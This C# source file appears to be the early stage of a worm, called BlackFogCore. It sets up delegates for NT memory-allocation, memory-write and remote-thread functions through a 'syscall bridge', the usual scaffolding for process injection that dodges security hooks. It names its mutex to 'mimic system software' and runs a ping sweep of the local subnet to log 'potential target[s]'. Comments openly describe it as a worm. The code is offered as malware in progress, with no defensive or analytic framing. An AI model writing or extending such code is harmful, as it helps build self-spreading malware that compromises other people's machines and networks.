using System.Runtime.InteropServices;
using System;
using System.Threading;
using System.Net;
using System.Net.NetworkInformation;
using System.Collections.Generic;


namespace BlackFogCore;


[StructLayout(LayoutKind.Sequential)]
public struct SYSCALL_BRIDGE
{
    public IntPtr NtAllocateAddr;
    public IntPtr NtProtectAddr;
    public IntPtr NtWriteAddr;
    public IntPtr NtThreadAddr;
}

[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate int NtAllocateVirtualMemory(
    IntPtr processHandle,
    ref IntPtr baseAddress,
    IntPtr zeroBits,
    ref UIntPtr regionSize,
    uint allocationType,
    uint protect);

[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate int NtProtectVirtualMemory(
    IntPtr processHandle,
    ref IntPtr baseAddress,
    ref UIntPtr regionSize,
    uint newProtect,
    out uint oldProtect);

[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate int NtWriteVirtualMemory(
    IntPtr processHandle,
    IntPtr baseAddress,
    byte[] buffer,
    uint bufferSize,
    out uint numberOfBytesWritten);

[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate int NtCreateThreadEx(
    out IntPtr threadHandle,
    uint desiredAccess,
    IntPtr objectAttributes,
    IntPtr processHandle,
    IntPtr startAddress,
    IntPtr parameter,
    bool createSuspended,
    uint stackZeroBits,
    uint sizeOfStackCommit,
    uint sizeOfStackReserve,
    IntPtr bytesBuffer);

public class Main
{
    private static NtAllocateVirtualMemory _ntAllocate;
    private static NtWriteVirtualMemory _ntWrite;

    private static List<string> _discoveredHosts = new List<string>();
    [UnmanagedCallersOnly(EntryPoint = "InitializeCore")]
    public static void InitializeCore(IntPtr bridgePtr)
    {
        var bridge = Marshal.PtrToStructure<SYSCALL_BRIDGE>(bridgePtr);

        _ntAllocate = Marshal.GetDelegateForFunctionPointer<NtAllocateVirtualMemory>(bridge.NtAllocateAddr);
        _ntWrite = Marshal.GetDelegateForFunctionPointer<NtWriteVirtualMemory>(bridge.NtWriteAddr);

        Run();
    }
    public static void Run()
    {
        // 1. MUTEX CHECK (Instance Control)
        // Using a boring GUID to mimic system software
        string mutexName = @"Global\{B4F06B19-B1AA-45E1-B573-01D9D95E0632}";

        using (Mutex mutex = new Mutex(true, mutexName, out bool createdNew))
        {
            if (!createdNew)
            {
                return;
            }
            StartDiscovery();

          
            while (true)
            {

                Thread.Sleep(10000); //
            }
        }
    }

    private static void StartDiscovery()
    {
        Console.WriteLine("[*] Starting discovery phase...");

        string localIp = GetLocalIpAddress();
        if (string.IsNullOrEmpty(localIp)) return;

        // Define the subnet (simplified for a home/office network /24)
        string baseIp = localIp.Substring(0, localIp.LastIndexOf('.') + 1);

        // A simple ping sweep (scanning neighbors)
        // In a real worm, this is done via asynchronous sockets, but for a start, this will do.
        for (int i = 1; i < 255; i++)
        {
            string target = baseIp + i;
            if (target == localIp) continue; 

            // Run the check in a separate thread to make it faster
            ThreadPool.QueueUserWorkItem(_ =>
            {
                if (IsHostReachable(target))
                {
                    lock (_discoveredHosts)
                    {
                        _discoveredHosts.Add(target);
                        Console.WriteLine($"[+] Found potential target: {target}");
                    }
                }
            });
        }
    }

    private static string GetLocalIpAddress()
    {
        foreach (var ip in Dns.GetHostAddresses(Dns.GetHostName()))
        {
            if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
            {
                return ip.ToString();
            }
        }
        return "";
    }

    private static bool IsHostReachable(string ip)
    {
        try
        {
            using (Ping p = new Ping())
            {
                // Wait for a response in 500ms. If the host is alive, it will respond.
                PingReply reply = p.Send(ip, 500);
                return reply.Status == IPStatus.Success;
            }
        }
        catch { return false; }
    }

}

